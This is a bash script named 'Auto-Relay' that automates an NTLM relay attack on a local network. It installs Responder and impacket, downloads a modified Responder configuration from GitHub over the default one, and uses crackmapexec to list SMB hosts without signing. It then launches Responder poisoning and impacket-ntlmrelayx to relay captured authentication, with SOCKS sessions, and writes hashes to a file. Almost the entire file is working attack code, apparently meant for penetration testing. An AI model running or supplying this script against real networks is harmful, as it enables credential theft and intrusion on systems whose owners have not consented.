#!/bin/bash

#Color Variables
RED="\e[91m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"
ITALIC="\e[3m"
BOLD="\e[1m"

#Heading!
echo -e "${RED}"
echo -e "###############################################################################"
echo -e "#${BLUE}                                                                            ${RED} #"
echo -e "#${BLUE}                AAA                                  iiii                   ${RED} #"
echo -e "#${BLUE}               A:::A                                i::::i                  ${RED} #"
echo -e "#${BLUE}              A:::::A                                iiii                   ${RED} #"
echo -e "#${BLUE}             A:::::::A                                                      ${RED} #"
echo -e "#${BLUE}            A:::::::::A           ggggggggg   gggggiiiiiii    ooooooooooo   ${RED} #"
echo -e "#${BLUE}           A:::::A:::::A         g:::::::::ggg::::gi:::::i  oo:::::::::::oo ${RED} #"
echo -e "#${BLUE}          A:::::A A:::::A       g:::::::::::::::::g i::::i o:::::::::::::::o${RED} #"
echo -e "#${BLUE}         A:::::A   A:::::A     g::::::ggggg::::::gg i::::i o:::::ooooo:::::o${RED} #"
echo -e "#${BLUE}        A:::::A     A:::::A    g:::::g     g:::::g  i::::i o::::o     o::::o${RED} #"
echo -e "#${BLUE}       A:::::AAAAAAAAA:::::A   g:::::g     g:::::g  i::::i o::::o     o::::o${RED} #"
echo -e "#${BLUE}      A:::::::::::::::::::::A  g:::::g     g:::::g  i::::i o::::o     o::::o${RED} #"
echo -e "#${BLUE}     A:::::AAAAAAAAAAAAA:::::A g::::::g    g:::::g  i::::i o::::o     o::::o${RED} #"
echo -e "#${BLUE}    A:::::A             A:::::Ag:::::::ggggg:::::g i::::::io:::::ooooo:::::o${RED} #"
echo -e "#${BLUE}   A:::::A               A:::::Ag::::::::::::::::g i::::::io:::::::::::::::o${RED} #"
echo -e "#${BLUE}  A:::::A                 A:::::Agg::::::::::::::g i::::::i oo:::::::::::oo ${RED} #"
echo -e "#${BLUE} AAAAAAA                   AAAAAAA gggggggg::::::g iiiiiiii   ooooooooooo   ${RED} #"
echo -e "#${BLUE}                                           g:::::g                          ${RED} #"
echo -e "#${BLUE}                               gggggg      g:::::g                          ${RED} #"
echo -e "#${BLUE}                               g:::::gg   gg:::::g                          ${RED} #"
echo -e "#${BLUE}                                g::::::ggg:::::::g                          ${RED} #"
echo -e "#${BLUE}                                 gg:::::::::::::g                           ${RED} #"
echo -e "#${BLUE}                                   ggg::::::ggg                             ${RED} #"
echo -e "#${BLUE}                                      gggggg                                ${RED} #"
echo -e "#${BLUE}                                                                            ${RED} #"
echo -e "#${GREEN}                                   Auto-Relay                               ${RED} #"
echo -e "#${BLUE}                                                                            ${RED} #"
echo -e "#${GREEN}                              Script Version 0.1                            ${RED} #"
echo -e "#${BLUE}                                                                            ${RED} #"
echo -e "#${GREEN}                by ${BLUE}Kyle Hoehn ${RED}with code stealing ${GREEN}from ${BLUE}Chris McMahon         ${RED} #"
echo -e "#${BLUE}                                                                            ${RED} #"
echo -e "###############################################################################"
echo -e "${RESET}"

#Root Check
if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo -e "[${RED}!${RESET}] Must be running as root or sudo. Quitting.\n"
    exit
fi

#Set Range to Ethernet Adapter by default unless a range is specified with -r
range="$(ip a | grep -w "inet" | cut -d " " -f 6 | grep -v "127.0.0.1/8")"

#Options
while getopts 'r:h' opt; do
  case "$opt" in
    r)
      range="$OPTARG"
      echo -e "[${GREEN}+${RESET}] IP Range is set to '$range'"
      ;;

    h)
      echo -e "[${RED}!${RESET}] Usage: $(basename $0) -r 10.10.10.0/24"
      echo -e "              -r:  specify IP Range (Required)"
      echo -e "              -h:  print this help dialog"
      exit 0
      ;;

    :)
      echo -e "[${RED}!${RESET}] Option requires an argument.\n\n    For usage, use $(basename $0) -h"
      exit 1
      ;;

    ?)
      echo -e "[${RED}!${RESET}] For usage, use $(basename $0) -h"
      exit 1
      ;;
    
  esac
done
shift "$(($OPTIND -1))"

#Variables for scripting use
varWorkingDir="$(pwd)"

#Installing dependencies if not already installed
echo -e "[${GREEN}+${RESET}] Checking for application dependencies."
if command -v terminator &> /dev/null
then
    echo -e "[${GREEN}+${RESET}] Terminator is installed."
else
echo -e "[${RED}!${RESET}] Installing Terminator."
apt update && apt install terminator -y
fi
if command -v responder &> /dev/null
then
    echo -e "[${GREEN}+${RESET}] Responder is installed."
else
echo -e "[${RED}!${RESET}] Installing Responder."
apt update && apt install responder -y
fi
if command -v impacket-ntlmrelayx &> /dev/null
then
    echo -e "[${GREEN}+${RESET}] Impacket-Scripts is installed."
else
echo -e "[${RED}!${RESET}] Installing Impacket-Scrpits."
apt update && apt install impacket-scripts -y
fi

#Removing original Responder Config File
echo -e "[${GREEN}+${RESET}] Renaming default Responder config file to \"/usr/share/responder/Responder.conf.old\"."
mv /usr/share/responder/Responder.conf /usr/share/responder/Responder.conf.old

#Downloading Modified Responder Config File
echo -e "[${GREEN}+${RESET}] Downloading modified Responder config file"
curl https://raw.githubusercontent.com/B0rk/Scripts/main/Responder_Config/ntlmrelayx_responder.conf -o /usr/share/responder/Responder.conf &> /dev/null

#Echo range selection
echo -e "[${GREEN}+${RESET}] Range is currently set to ${range}."

#Sleep to allow for removal and downloading to complete.
echo -e "[${GREEN}+${RESET}] Taking a 5 second nap to get my shit together..."
sleep 5

#Running CrackMapExec to create a relay list
echo -e "[${GREEN}+${RESET}] Generating relay list for the ${range} IP range."
crackmapexec smb ${range} --gen-relay-list ${varWorkingDir}/relay_targets.txt

#Launching Responder and impacket-ntlmrelayx
echo -e "[${GREEN}+${RESET}] Checking for relay list."
if [ ! -f "${varWorkingDir}/relay_targets.txt" ]; then
  echo -e "[${RED}!${RESET}] ${RED}Relay file does not exist.${RESET} ${YELLOW}Sorry about your luck...${RESET}"
else
  echo -e "[${GREEN}*${RESET}] ${RED}LET THE GAMES BEGIN!${RESET}"
  terminator -e "responder -I eth0 -w"
  terminator -e "impacket-ntlmrelayx -tf ${varWorkingDir}/relay_targets.txt -smb2support -socks --output-file ${varWorkingDir}/ntlmrelayx_hashes.out"
fi
